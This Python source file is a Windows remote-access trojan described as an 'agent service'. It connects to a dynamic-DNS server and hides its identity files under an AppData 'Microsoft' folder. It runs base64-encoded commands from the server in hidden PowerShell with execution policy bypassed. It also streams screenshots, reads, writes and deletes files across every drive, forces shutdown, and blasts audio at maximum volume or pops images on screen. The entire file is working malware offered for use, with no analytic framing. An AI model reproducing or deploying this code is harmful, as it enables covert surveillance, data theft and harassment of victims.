"""
Run Client Daemon - Windows Agent Service
Establishes real-time bi-directional WebSocket connection to the central server.
Supports live desktop streaming, on-demand screenshots, remote command execution,
interactive image dialog popups, maximum-volume audio blasting, and remote filesystem (FTP) exploration.
"""

import os
import sys
import time
import io
import base64
import threading
import subprocess
import ctypes
import shutil
import string
import tempfile
from typing import Any, Dict, List, Optional, Tuple, Union

from PIL import ImageGrab, Image
import socketio

# ── Single Instance Enforcement (Windows Named Mutex) ────────────────────────

kernel32 = ctypes.windll.kernel32
user32 = ctypes.windll.user32

# Create or open global mutex to prevent concurrent duplicate client instances
mutex = kernel32.CreateMutexW(None, False, "run_py_mutex")
if kernel32.GetLastError() == 183:  # ERROR_ALREADY_EXISTS
    sys.exit(0)

# ── Server Configuration & Unique Client Identity ────────────────────────────

VPS_URL: str = os.getenv("VPS_URL", "http://runx.ddns.net")

# Attempt import of build-time etched configuration if compiled by build.py
try:
    import client_config  # type: ignore

    CLIENT_KEY: str = getattr(client_config, "CLIENT_KEY", "")
    CLIENT_VERSION: str = getattr(client_config, "CLIENT_VERSION", "dev")
except ImportError:
    CLIENT_KEY = ""
    CLIENT_VERSION = "dev"

# Resolve user application data directory
app_data: str = os.getenv("APPDATA") or os.path.expanduser("~\\AppData\\Roaming")
data_dir: str = os.path.join(app_data, "Microsoft", "run")
ID_PATH: str = os.path.join(data_dir, "run.txt")
DAT_PATH: str = os.path.join(data_dir, "run.dat")
raw_user: str = os.getenv("USERNAME", "user")
os_suffix: str = "W"  # Windows platform identifier

# Read existing version hash if persisted by installer
if os.path.exists(DAT_PATH):
    try:
        with open(DAT_PATH, "r", encoding="utf-8") as f:
            v_raw = f.read().strip()
            if v_raw:
                CLIENT_VERSION = v_raw[:7]
    except Exception:
        pass

# Ensure client identity directory exists and resolve or generate unique 8-character ID
os.makedirs(os.path.dirname(ID_PATH), exist_ok=True)
if os.path.exists(ID_PATH):
    with open(ID_PATH, "r", encoding="utf-8") as f:
        raw_id = f.read().strip()
    unique_id: str = raw_id[:8] if len(raw_id) >= 8 else raw_id
else:
    import uuid

    unique_id = str(uuid.uuid4())[:8]
    with open(ID_PATH, "w", encoding="utf-8") as f:
        f.write(unique_id)

# Composite client username (format: USERNAME-UNIQUEID-W)
unique_user: str = f"{raw_user}-{unique_id}-{os_suffix}"

# ── SocketIO Client Initialization & State ───────────────────────────────────

sio = socketio.Client(reconnection=True, reconnection_delay=2, reconnection_delay_max=10)

capture_active: bool = False
capture_thread: Optional[threading.Thread] = None
capture_lock = threading.Lock()


# ── Desktop Screen Capture & Streaming Subsystem ─────────────────────────────

def grab_screen() -> Optional[Image.Image]:
    """
    Capture the primary desktop display screen using Pillow ImageGrab.

    Returns:
        Optional[Image.Image]: A PIL Image instance if capture succeeded, None on error.
    """
    try:
        return ImageGrab.grab()
    except Exception as e:
        print(f"[Screen Grab Error] Failed to capture desktop: {e}")
        return None


def take_and_upload_screenshot(req_id: Optional[str] = None) -> Optional[str]:
    """
    Capture desktop screenshot, downsample to half resolution in grayscale,
    compress to JPEG, and stream over WebSocket to the server.

    Parameters:
        req_id (Optional[str]): Single screenshot request ID to acknowledge upon completion.

    Returns:
        Optional[str]: Generated image filename if successful, None otherwise.
    """
    try:
        timestamp = (
            time.strftime("%Y%m%d%H%M%S") + f"{int(time.time() * 1000) % 1000:03d}"
        )
        filename = f"{timestamp}.jpg"

        img = grab_screen()
        if img is None:
            if req_id and sio.connected:
                sio.emit(
                    "capture_screenshot_res",
                    {"req_id": req_id, "error": "Failed to grab screen"},
                )
            return None

        w, h = img.size
        try:
            with img.resize((w // 2, h // 2), Image.Resampling.BILINEAR).convert("L") as img_resized:
                with io.BytesIO() as buf:
                    img_resized.save(buf, format="JPEG", quality=80)
                    img_bytes = buf.getvalue()
        finally:
            img.close()

        if sio.connected:
            sio.emit(
                "upload_frame",
                {"username": unique_user, "filename": filename, "image": img_bytes},
            )
            if req_id:
                sio.emit(
                    "capture_screenshot_res",
                    {
                        "req_id": req_id,
                        "success": True,
                        "filename": filename,
                        "width": w,
                        "height": h,
                    },
                )
            return filename
    except Exception as e:
        print(f"[Screenshot Upload Error] {e}")
        if req_id and sio.connected:
            try:
                sio.emit("capture_screenshot_res", {"req_id": req_id, "error": str(e)})
            except Exception:
                pass
    return None


def capture_loop() -> None:
    """
    Continuous worker loop capturing and streaming desktop frames while capture_active is True.
    """
    while True:
        with capture_lock:
            if not capture_active:
                break
        take_and_upload_screenshot()
        time.sleep(1)


# ── SocketIO Core Lifecycle Events ───────────────────────────────────────────

@sio.event
def connect() -> None:
    """
    Handle connection established event. Automatically registers client metadata with server.
    """
    print(f"Connected to WebSocket server as {unique_user} (version: {CLIENT_VERSION})")
    sio.emit(
        "register",
        {
            "username": unique_user,
            "auth_token": CLIENT_KEY,
            "version": CLIENT_VERSION,
        },
    )


@sio.event
def disconnect() -> None:
    """
    Handle socket disconnection event.
    """
    print("Disconnected from WebSocket server")


# ── Command & Remote Execution Handlers ──────────────────────────────────────

@sio.on("exec_command")
def on_exec_command(data: Any) -> None:
    """
    Handle incoming remote command execution request dispatched from administrative dashboard.

    Parameters:
        data (dict): Payload containing base64/raw 'cmd' string and 'visible' flag.
    """
    if not isinstance(data, dict):
        return

    cmd_raw = data.get("cmd", "")
    visible = data.get("visible", 0)

    if not cmd_raw:
        return

    try:
        decoded_cmd = base64.b64decode(cmd_raw).decode("utf-8")
    except Exception:
        decoded_cmd = cmd_raw

    print(f"Executing command: {decoded_cmd}")

    # Special administrative commands
    if "panic" in decoded_cmd.lower():
        sys.exit(0)
    elif "altf4" in decoded_cmd.lower():
        subprocess.Popen(
            ["shutdown", "/s", "/t", "0"], creationflags=subprocess.CREATE_NO_WINDOW
        )
        return

    cmd_str = decoded_cmd.strip()
    creation_flags = (
        subprocess.CREATE_NEW_CONSOLE if visible else subprocess.CREATE_NO_WINDOW
    )

    if cmd_str.lower().startswith("powershell"):
        subprocess.Popen(cmd_str, shell=True, creationflags=creation_flags)
    else:
        ps_cmd = [
            "powershell.exe",
            "-NoProfile",
            "-NonInteractive",
            "-ExecutionPolicy",
            "Bypass",
        ]
        if not visible:
            ps_cmd.extend(["-WindowStyle", "Hidden"])
        ps_cmd.extend(["-Command", cmd_str])
        subprocess.Popen(ps_cmd, creationflags=creation_flags)


@sio.on("set_capture")
def on_set_capture(data: Any) -> None:
    """
    Toggle the continuous screenshot streaming background worker on or off.

    Parameters:
        data (dict): Payload containing boolean 'capture' flag.
    """
    global capture_active, capture_thread
    if not isinstance(data, dict):
        return

    should_capture = bool(data.get("capture", False))

    with capture_lock:
        if should_capture and not capture_active:
            capture_active = True
            capture_thread = threading.Thread(target=capture_loop, daemon=True)
            capture_thread.start()
        elif not should_capture and capture_active:
            capture_active = False


@sio.on("take_screenshot")
def on_take_screenshot(data: Any = None) -> None:
    """
    Handle single on-demand screenshot request from dashboard.

    Parameters:
        data (dict): Optional payload containing 'req_id'.
    """
    req_id = data.get("req_id") if isinstance(data, dict) else None

    with capture_lock:
        is_streaming = capture_active

    if is_streaming:
        if req_id and sio.connected:
            sio.emit(
                "capture_screenshot_res",
                {
                    "req_id": req_id,
                    "error": "Cannot capture screenshot while Screenshot Stream is active.",
                },
            )
        return

    threading.Thread(target=take_and_upload_screenshot, args=(req_id,), daemon=True).start()


# ── Interactive Imager Dialog Subsystem ──────────────────────────────────────

def _show_image_dialog(image_b64: str, caption: str = "") -> None:
    """
    Display a centered, top-most WinForms image viewer dialog with ESC/Enter to close.
    Handles WebP conversion to PNG/GIF transparently for GDI+ compatibility.

    Parameters:
        image_b64 (str): Base64-encoded image data.
        caption (str): Optional caption text for the dialog window title.
    """
    temp_path: Optional[str] = None
    try:
        raw_bytes = base64.b64decode(image_b64)
        ext = "png"
        if raw_bytes.startswith(b"\xff\xd8"):
            ext = "jpg"
        elif raw_bytes.startswith(b"GIF"):
            ext = "gif"
        elif raw_bytes.startswith(b"RIFF") and b"WEBP" in raw_bytes[:16]:
            ext = "webp"

        # GDI+ does not natively support WebP. Convert via Pillow to PNG or animated GIF.
        if ext == "webp" or (raw_bytes.startswith(b"RIFF") and b"WEBP" in raw_bytes[:16]):
            try:
                with Image.open(io.BytesIO(raw_bytes)) as pil_img:
                    with io.BytesIO() as buf:
                        if getattr(pil_img, "is_animated", False):
                            frames = []
                            for frame_idx in range(pil_img.n_frames):
                                pil_img.seek(frame_idx)
                                frames.append(pil_img.convert("RGBA"))
                            frames[0].save(
                                buf,
                                format="GIF",
                                save_all=True,
                                append_images=frames[1:],
                                loop=0,
                                duration=pil_img.info.get("duration", 100),
                            )
                            ext = "gif"
                        else:
                            if pil_img.mode in ("RGBA", "LA") or (pil_img.mode == "P" and "transparency" in pil_img.info):
                                pil_img.convert("RGBA").save(buf, format="PNG")
                            else:
                                pil_img.convert("RGB").save(buf, format="PNG")
                            ext = "png"
                        raw_bytes = buf.getvalue()
            except Exception as conv_err:
                print(f"[Imager] WebP conversion error: {conv_err}")

        temp_dir = os.getenv("TEMP") or tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, f"run_img_{int(time.time() * 1000)}.{ext}")
        with open(temp_path, "wb") as f:
            f.write(raw_bytes)

        caption_escaped = caption.replace("'", "''").replace('"', '`"')
        ps_script = f"""
Add-Type -AssemblyName System.Windows.Forms,System.Drawing;
$img = [Drawing.Image]::FromFile('{temp_path}');
$maxW = 960; $maxH = 720;
$iw = $img.Width; $ih = $img.Height;
$scale = [Math]::Min([Math]::Min(($maxW / $iw), ($maxH / $ih)), 1.0);
$dw = [Math]::Max([int]($iw * $scale), 120);
$dh = [Math]::Max([int]($ih * $scale), 90);

$f = New-Object Windows.Forms.Form;
$caption = '{caption_escaped}';
$f.Text = if ($caption.Length -gt 0) {{ $caption }} else {{ 'Image' }};
$f.ClientSize = New-Object Drawing.Size($dw, $dh);
$f.StartPosition = 'CenterScreen';
$f.TopMost = $true;
$f.FormBorderStyle = 'FixedDialog';
$f.MaximizeBox = $false;
$f.MinimizeBox = $false;
$f.BackColor = [Drawing.Color]::FromArgb(24, 24, 27);
$f.KeyPreview = $true;
$f.Add_KeyDown({{
    if ($_.KeyCode -eq [Windows.Forms.Keys]::Escape -or $_.KeyCode -eq [Windows.Forms.Keys]::Enter) {{
        $f.Close();
    }}
}});

$pb = New-Object Windows.Forms.PictureBox;
$pb.Image = $img;
$pb.SizeMode = 'Zoom';
$pb.Dock = [Windows.Forms.DockStyle]::Fill;
$f.Controls.Add($pb);

$f.Add_FormClosed({{
    $pb.Image = $null;
    $img.Dispose();
    $f.Dispose();
}});
[void]$f.ShowDialog();
"""
        cmd = [
            "powershell.exe",
            "-NoProfile",
            "-ExecutionPolicy",
            "Bypass",
            "-Command",
            ps_script,
        ]
        subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"[Imager] Error showing image dialog: {e}")
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception:
                pass


@sio.on("display_image")
def on_display_image(data: Any) -> None:
    """
    Handle display_image WebSocket event and dispatch modal dialog worker thread.

    Parameters:
        data (dict): Payload containing base64 'image' string and optional 'caption'.
    """
    if not isinstance(data, dict):
        return
    image_b64 = data.get("image", "")
    caption = data.get("caption", "")
    if not image_b64:
        return
    print(f"Received display_image request (caption: {caption})")
    threading.Thread(target=_show_image_dialog, args=(image_b64, caption), daemon=True).start()


# ── Audio Player Subsystem ───────────────────────────────────────────────────

def _max_out_speaker() -> None:
    """
    Unmute and maximize Windows master audio output volume using virtual key events.
    """
    try:
        # VK_VOLUME_UP = 0xAF. Sending 50 key presses unmutes and raises master volume to 100%
        for _ in range(50):
            user32.keybd_event(0xAF, 0, 0, 0)
            user32.keybd_event(0xAF, 0, 2, 0)
    except Exception as e:
        print(f"[Audio] Error setting master volume: {e}")


def _get_short_path(long_path: str) -> str:
    """
    Convert a long path with spaces or special characters to an 8.3 short path for WinMM MCI.

    Parameters:
        long_path (str): The standard absolute path to convert.

    Returns:
        str: 8.3 compatible path string, or original path if conversion fails.
    """
    try:
        buf = ctypes.create_unicode_buffer(1024)
        if kernel32.GetShortPathNameW(long_path, buf, 1024) > 0:
            return buf.value
    except Exception:
        pass
    return long_path


def _play_audio_clip(audio_b64: str, filename: str = "", title: str = "") -> None:
    """
    Decode, unmute master speaker, and blast an audio file at 100% volume via WinMM MCI or MediaPlayer.

    Parameters:
        audio_b64 (str): Base64-encoded audio clip payload.
        filename (str): Original filename for extension deduction.
        title (str): Optional audio title for logging.
    """
    temp_path: Optional[str] = None
    try:
        raw_bytes = base64.b64decode(audio_b64)
        ext = "mp3"
        if filename and "." in filename:
            cand = filename.rsplit(".", 1)[-1].lower()
            if cand in ["mp3", "wav", "m4a", "wma", "aac", "ogg"]:
                ext = cand

        temp_dir = os.getenv("TEMP") or tempfile.gettempdir()
        temp_path = os.path.join(temp_dir, f"run_audio_{int(time.time() * 1000)}.{ext}")
        with open(temp_path, "wb") as f:
            f.write(raw_bytes)

        # 1. Unmute and maximize speaker output
        _max_out_speaker()

        # 2. Try native WinMM MCI in-process at maximum volume
        played = False
        alias = f"run_snd_{int(time.time() * 1000)}"
        try:
            winmm = ctypes.windll.winmm
            short_p = _get_short_path(temp_path)
            winmm.mciSendStringW(f'close "{alias}"', None, 0, None)

            # Try type mpegvideo (standard for MP3) first
            err = winmm.mciSendStringW(f'open "{short_p}" type mpegvideo alias "{alias}"', None, 0, None)
            if err != 0:
                err = winmm.mciSendStringW(f'open "{short_p}" alias "{alias}"', None, 0, None)

            if err == 0:
                winmm.mciSendStringW(f'setaudio "{alias}" volume to 1000', None, 0, None)
                err_play = winmm.mciSendStringW(f'play "{alias}" wait', None, 0, None)
                winmm.mciSendStringW(f'close "{alias}"', None, 0, None)
                if err_play == 0:
                    played = True
        except Exception as e:
            print(f"[Audio] MCI error: {e}")
        finally:
            try:
                ctypes.windll.winmm.mciSendStringW(f'close "{alias}"', None, 0, None)
            except Exception:
                pass

        # 3. Fallback to PowerShell PresentationCore MediaPlayer if MCI was unsupported
        if not played:
            escaped_path = temp_path.replace("'", "''")
            ps_script = f"""
$wscript = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) {{ $wscript.SendKeys([char]175) }}

Add-Type -AssemblyName PresentationCore
$player = New-Object System.Windows.Media.MediaPlayer
$player.Open([System.Uri]'{escaped_path}')
$player.Volume = 1.0
$player.Play()
Start-Sleep -Milliseconds 600
$dur = 12
if ($player.NaturalDuration.HasTimeSpan) {{
    $dur = [Math]::Ceiling($player.NaturalDuration.TimeSpan.TotalSeconds) + 1
}}
Start-Sleep -Seconds $dur
$player.Close()
"""
            cmd = [
                "powershell.exe",
                "-NoProfile",
                "-Sta",
                "-ExecutionPolicy",
                "Bypass",
                "-Command",
                ps_script,
            ]
            subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print(f"[Audio] Error playing audio: {e}")
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception:
                pass


@sio.on("play_audio")
def on_play_audio(data: Any) -> None:
    """
    Handle play_audio WebSocket event and launch playback worker thread.

    Parameters:
        data (dict): Payload containing base64 'audio' data, 'filename', and optional 'title'.
    """
    if not isinstance(data, dict):
        return
    audio_b64 = data.get("audio", "")
    filename = data.get("filename", "audio.mp3")
    title = data.get("title", "")
    if not audio_b64:
        return
    print(f"Received play_audio request ({filename})")
    threading.Thread(target=_play_audio_clip, args=(audio_b64, filename, title), daemon=True).start()


# ── Remote File System (FTP) Operations Subsystem ────────────────────────────

def get_windows_drives() -> List[Dict[str, Any]]:
    """
    Enumerate all mounted logical drives on Windows with capacity and volume label metadata.

    Returns:
        List[Dict[str, Any]]: Array of drive descriptor dictionaries.
    """
    drives: List[Dict[str, Any]] = []
    bitmask = kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drive_root = f"{letter}:\\"
            label = "Local Disk"
            total, free = 0, 0
            try:
                vol_buf = ctypes.create_unicode_buffer(1024)
                fs_buf = ctypes.create_unicode_buffer(1024)
                kernel32.GetVolumeInformationW(
                    drive_root,
                    vol_buf,
                    ctypes.sizeof(vol_buf),
                    None,
                    None,
                    None,
                    fs_buf,
                    ctypes.sizeof(fs_buf),
                )
                raw_label = vol_buf.value.strip()
                if raw_label:
                    label = raw_label
            except Exception:
                pass
            try:
                total, used, free = shutil.disk_usage(drive_root)
            except Exception:
                pass
            drives.append(
                {
                    "path": drive_root,
                    "label": f"{letter}: ({label})",
                    "total": total,
                    "free": free,
                }
            )
        bitmask >>= 1
    return drives


def scan_directory(target_path: str, max_items: int = 5000) -> Dict[str, Any]:
    """
    Scan directory entries safely without following symlinks and return sorted file listings.

    Parameters:
        target_path (str): Filesystem path to directory.
        max_items (int): Upper bound on items scanned to prevent out-of-memory errors.

    Returns:
        Dict[str, Any]: Directory payload containing items array, parent path, or error.
    """
    target_path = os.path.abspath(target_path)
    if not os.path.exists(target_path):
        return {"error": f"Path not found: {target_path}", "path": target_path, "items": []}

    items: List[Dict[str, Any]] = []
    try:
        with os.scandir(target_path) as it:
            count = 0
            for entry in it:
                if count >= max_items:
                    break
                try:
                    is_dir = entry.is_dir(follow_symlinks=False)
                    stat = entry.stat(follow_symlinks=False)
                    ext = "" if is_dir else os.path.splitext(entry.name)[1].lower()
                    items.append(
                        {
                            "name": entry.name,
                            "is_dir": is_dir,
                            "size": 0 if is_dir else stat.st_size,
                            "mtime": int(stat.st_mtime),
                            "ext": ext,
                        }
                    )
                except Exception:
                    items.append(
                        {
                            "name": entry.name,
                            "is_dir": False,
                            "size": 0,
                            "mtime": 0,
                            "ext": "",
                            "restricted": True,
                        }
                    )
                count += 1
    except PermissionError:
        return {"error": "Access Denied: Administrator permission required", "path": target_path, "items": []}
    except Exception as e:
        return {"error": str(e), "path": target_path, "items": []}

    items.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
    parent = os.path.dirname(target_path) if os.path.dirname(target_path) != target_path else None
    return {
        "path": target_path,
        "parent": parent,
        "items": items,
    }


def read_file_preview(file_path: str, max_bytes: int = 512000) -> Dict[str, Any]:
    """
    Read file contents for live preview in dashboard editor.
    Returns plain text if UTF-8, or base64 if binary, bounded by max_bytes.

    Parameters:
        file_path (str): Target file path.
        max_bytes (int): Maximum bytes to read for preview (default 500 KB).

    Returns:
        Dict[str, Any]: Dictionary with 'name', 'size', 'type', and 'content' or 'error'.
    """
    try:
        file_path = os.path.abspath(file_path)
        if not os.path.isfile(file_path):
            return {"error": "Target is not a valid file"}
        size = os.path.getsize(file_path)
        if size > max_bytes:
            return {
                "error": f"File too large for live preview ({size} bytes). Limit is 500 KB.",
                "name": os.path.basename(file_path),
            }
        with open(file_path, "rb") as f:
            raw = f.read(max_bytes)
        try:
            text = raw.decode("utf-8")
            return {
                "name": os.path.basename(file_path),
                "path": file_path,
                "size": size,
                "type": "text",
                "content": text,
            }
        except UnicodeDecodeError:
            return {
                "name": os.path.basename(file_path),
                "path": file_path,
                "size": size,
                "type": "binary",
                "content": base64.b64encode(raw).decode("utf-8"),
            }
    except Exception as e:
        return {"error": str(e)}


def write_file(file_path: str, content: str, is_base64: bool = False) -> Dict[str, Any]:
    """
    Write or overwrite file contents on client filesystem, creating parent directories if needed.

    Parameters:
        file_path (str): Target filesystem path.
        content (str): Plain text or base64-encoded string.
        is_base64 (bool): True if content is base64-encoded binary.

    Returns:
        Dict[str, Any]: Result dictionary with 'success', 'path', 'size' or 'error'.
    """
    try:
        file_path = os.path.abspath(file_path)
        parent = os.path.dirname(file_path)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        if is_base64:
            raw = base64.b64decode(content)
            with open(file_path, "wb") as f:
                f.write(raw)
        else:
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(content)
        return {"success": True, "path": file_path, "size": os.path.getsize(file_path)}
    except Exception as e:
        return {"error": str(e)}


def delete_path(target_path: str) -> Dict[str, Any]:
    """
    Delete a file or recursively remove a directory on client filesystem.

    Parameters:
        target_path (str): Path to file or folder.

    Returns:
        Dict[str, Any]: Status dictionary with 'success' or 'error'.
    """
    try:
        target_path = os.path.abspath(target_path)
        if not os.path.exists(target_path):
            return {"error": "Target path not found"}
        if os.path.isdir(target_path):
            shutil.rmtree(target_path)
        else:
            os.remove(target_path)
        return {"success": True, "path": target_path}
    except Exception as e:
        return {"error": str(e)}


def make_directory(dir_path: str) -> Dict[str, Any]:
    """
    Create a new directory and any missing parent folders on client filesystem.

    Parameters:
        dir_path (str): Target directory path.

    Returns:
        Dict[str, Any]: Status dictionary with 'success' or 'error'.
    """
    try:
        dir_path = os.path.abspath(dir_path)
        os.makedirs(dir_path, exist_ok=True)
        return {"success": True, "path": dir_path}
    except Exception as e:
        return {"error": str(e)}


def rename_path(old_path: str, new_path: str) -> Dict[str, Any]:
    """
    Rename or move a file or folder on client filesystem.

    Parameters:
        old_path (str): Existing path.
        new_path (str): Target destination path.

    Returns:
        Dict[str, Any]: Status dictionary with 'success' or 'error'.
    """
    try:
        old_path = os.path.abspath(old_path)
        new_path = os.path.abspath(new_path)
        if not os.path.exists(old_path):
            return {"error": "Source path does not exist"}
        os.rename(old_path, new_path)
        return {"success": True, "old_path": old_path, "new_path": new_path}
    except Exception as e:
        return {"error": str(e)}


# ── Remote File System WebSocket Event Listeners ─────────────────────────────

@sio.on("fs_list_req")
def on_fs_list_req(data: Any) -> None:
    """Handle directory listing or drives enumeration request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    path = data.get("path")
    drives = get_windows_drives()
    if not path or path == "drives":
        payload = {"is_drives": True, "drives": drives, "path": "Drives", "items": []}
    else:
        payload = scan_directory(path)
        payload["is_drives"] = False
        payload["drives"] = drives
    sio.emit("fs_list_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_read_req")
def on_fs_read_req(data: Any) -> None:
    """Handle file content preview read request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    file_path = data.get("path")
    payload = read_file_preview(file_path)
    sio.emit("fs_read_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_write_req")
def on_fs_write_req(data: Any) -> None:
    """Handle file save / edit write request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    file_path = data.get("path")
    content = data.get("content", "")
    is_base64 = bool(data.get("is_base64", False))
    payload = write_file(file_path, content, is_base64=is_base64)
    sio.emit("fs_write_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_delete_req")
def on_fs_delete_req(data: Any) -> None:
    """Handle file or folder deletion request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    target_path = data.get("path")
    payload = delete_path(target_path)
    sio.emit("fs_delete_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_mkdir_req")
def on_fs_mkdir_req(data: Any) -> None:
    """Handle new directory creation request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    dir_path = data.get("path")
    payload = make_directory(dir_path)
    sio.emit("fs_mkdir_res", {"req_id": req_id, "payload": payload})


@sio.on("fs_rename_req")
def on_fs_rename_req(data: Any) -> None:
    """Handle file or folder rename request."""
    if not isinstance(data, dict):
        return
    req_id = data.get("req_id")
    old_path = data.get("old_path")
    new_path = data.get("new_path")
    payload = rename_path(old_path, new_path)
    sio.emit("fs_rename_res", {"req_id": req_id, "payload": payload})


# ── Client Heartbeat & Main Connection Lifecycle ─────────────────────────────

def heartbeat_loop() -> None:
    """
    Background worker periodically transmitting heartbeat keepalive pings every 5 seconds.
    """
    while True:
        if sio.connected:
            try:
                sio.emit(
                    "heartbeat",
                    {
                        "username": unique_user,
                        "version": CLIENT_VERSION,
                    },
                )
            except Exception:
                pass
        time.sleep(5)


def main() -> None:
    """
    Primary client entry point. Spawns heartbeat thread and enters auto-reconnecting socket loop.
    """
    hb_thread = threading.Thread(target=heartbeat_loop, daemon=True)
    hb_thread.start()

    while True:
        try:
            if not sio.connected:
                sio.connect(
                    VPS_URL,
                    wait_timeout=10,
                    transports=["websocket", "polling"],
                    auth={"token": CLIENT_KEY},
                )
                sio.wait()
        except Exception:
            pass
        time.sleep(5)


if __name__ == "__main__":
    main()
